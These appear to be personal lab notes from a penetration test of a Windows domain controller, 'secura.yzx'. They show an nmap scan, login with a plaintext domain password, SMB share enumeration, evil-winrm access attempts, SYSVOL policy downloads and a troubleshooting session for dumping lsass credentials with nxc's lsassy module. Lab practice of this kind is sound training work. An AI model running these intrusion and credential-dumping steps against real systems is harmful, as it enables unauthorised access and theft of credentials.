## 0-Secure
```
?$ nmap -p- -sV -sC  192.168.62.97
Starting Nmap 7.98 ( https://nmap.org ) at 2026-07-02 05:42 +0000
Stats: 0:02:42 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 98.30% done; ETC: 05:45 (0:00:00 remaining)
Nmap scan report for 192.168.62.97
Host is up (0.00031s latency).
Not shown: 65514 filtered tcp ports (no-response)
PORT      STATE SERVICE      VERSION
53/tcp    open  domain       Simple DNS Plus
88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2026-07-02 05:44:37Z)
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: secura.yzx, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: SECURA)
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: secura.yzx, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf       .NET Message Framing
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49668/tcp open  msrpc        Microsoft Windows RPC
49677/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
49678/tcp open  msrpc        Microsoft Windows RPC
49681/tcp open  msrpc        Microsoft Windows RPC
49708/tcp open  msrpc        Microsoft Windows RPC
49798/tcp open  msrpc        Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb2-time: 
|   date: 2026-07-02T05:45:27
|_  start_date: 2026-06-01T23:46:40
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
|_clock-skew: mean: 1s, deviation: 2s, median: 0s
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: dc01
|   NetBIOS computer name: DC01\x00
|   Domain name: secura.yzx
|   Forest name: secura.yzx
|   FQDN: dc01.secura.yzx
|_  System time: 2026-07-02T05:45:29+00:00
```
#### [1]
```
$ nxc smb 192.168.82.97 -u Eric.Wallows -p EricLikesRunning800
SMB         192.168.82.97   445    DC01             [*] Windows Server 2016 Standard 14393 x64 (name:DC01) (domain:secura.yzx) (signing:True) (SMBv1:True) (Null Auth:True)                                                            
SMB         192.168.82.97   445    DC01             [+] secura.yzx\Eric.Wallows:EricLikesRunning800
```
#### [2]
```
$ smbclient -L //192.168.82.97 -U Eric.Wallows
Password for [WORKGROUP\Eric.Wallows]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 
        test            Disk      
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 192.168.82.97 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```
#### 没有添加域名
```
$ evil-winrm -i secura.yzx -u Eric.Wallows -p EricLiskesRunning800
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline                          
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                     
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\> whoami
                                        
Error: Check your /etc/hosts file to ensure you can resolve secura.yzx
                                        
Error: Exiting with code 1
```
#### 添加域名
```
$ sudo vi /etc/hosts

192.168.82.97 secura.yzx
```
#### 下载
```
$ smbclient  //192.168.82.97/SYSVOL -U Eric.Wallows

smb: \secura.yzx\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Services\> get Services.xml

smb: \secura.yzx\Policies\{6AC1786C-016F-11D2-945F-00C04FB984F9}\MACHINE\Microsoft\Windows NT\SecEdit\> get GptTmpl.inf
```
#### *S-1-5-32-544
#### $ cat Services.xml
```
<?xml version="1.0" encoding="utf-8"?>
<NTServices clsid="{2CFB484A-4E96-4b5d-A0B6-093D2F91E6AE}"><NTService clsid="{AB6F0B67-341F-4e51-92F9-005FBFBA1A43}" name="WinRM" image="2" changed="2022-10-25 17:35:16" uid="{401AC3E6-C47E-44A5-89E4-FC427698E07D}"><Properties startupType="AUTOMATIC" serviceName="WinRM" serviceAction="START" timeout="30"/></NTService>
</NTServices>
```
#### 遇到的问题：nxc smb 无法使用 -M lsassy
```
┌──(syareya55㉿kali)-[~]
└─$ nxc smb 192.168.238.95 -u 'Eric.Wallows' -p 'EricLikesRunning800' -M lsassy --no-smb
SMB         192.168.238.95  445    SECURE           [*] Windows 10 / Server 2019 Build 19041 x64 (name:SECURE) (domain:secura.yzx) (signing:False) (SMBv1:None)                                                                        
SMB         192.168.238.95  445    SECURE           [+] secura.yzx\Eric.Wallows:EricLikesRunning800 (Pwn3d!)
[03:17:49] ERROR    Exception while calling proto_flow() on connection.py:187
                    target 192.168.238.95: [Errno 32]                        
                    Broken pipe
             
┌──(syareya55㉿kali)-[~]
└─$ nxc --version
1.5.1 - Yippie-Ki-Yay - Kali Linux - 
                                                                             
┌──(syareya55㉿kali)-[~]
└─$ python3 -c "import lsassy; print(lsassy.__version__)"
3.1.11
                                                                             
┌──(syareya55㉿kali)-[~]
└─$ python3 -c "import impacket; print(impacket.__version__)"
Traceback (most recent call last):
  File "<string>", line 1, in <module>
    import impacket; print(impacket.__version__)
                           ^^^^^^^^^^^^^^^^^^^^
AttributeError: module 'impacket' has no attribute '__version__'
                                                                             
┌──(syareya55㉿kali)-[~]
└─$ nxc smb -M lsassy --options
[*] lsassy module options:

METHOD              Method to use to dump lsass.exe with lsassy
DUMP_TICKETS        If set, will dump Kerberos tickets (Default: True)
SAVE_DIR            Directory to save dumped tickets
SAVE_TYPE           Type of ticket to save, either 'kirbi' or 'ccache' (Default: 'ccache')

                                                                             
┌──(syareya55㉿kali)-[~]
└─$ python3 -m pip show impacket
Name: impacket
Version: 0.14.0.dev0
Summary: Network protocols Constructors and Dissectors
Home-page: https://www.coresecurity.com
Author: SecureAuth Corporation
Author-email: 
License: Apache modified
Location: /usr/lib/python3/dist-packages
Requires: charset_normalizer, flask, ldap3, ldapdomaindump, pyasn1, pyasn1_modules, pycryptodomex, pyOpenSSL, six
Required-by: bloodhound, certipy-ad, dploot, lsassy, masky, netexec, patator, smbmap
                                                                             
┌──(syareya55㉿kali)-[~]
└─$ dpkg -l | grep impacket
ii  impacket-scripts                       1.10                                     all          Links to useful impacket scripts examples
ii  python3-impacket                       0.13.0+git20251120-9c2d8b6-0kali1        all          Python3 module to easily build and dissect network protocols
                                                                             
┌──(syareya55㉿kali)-[~]
└─$ nxc smb -M lsassy -o METHOD=help
usage: nxc smb [-h] [--version] [-t THREADS] [--timeout TIMEOUT]
```
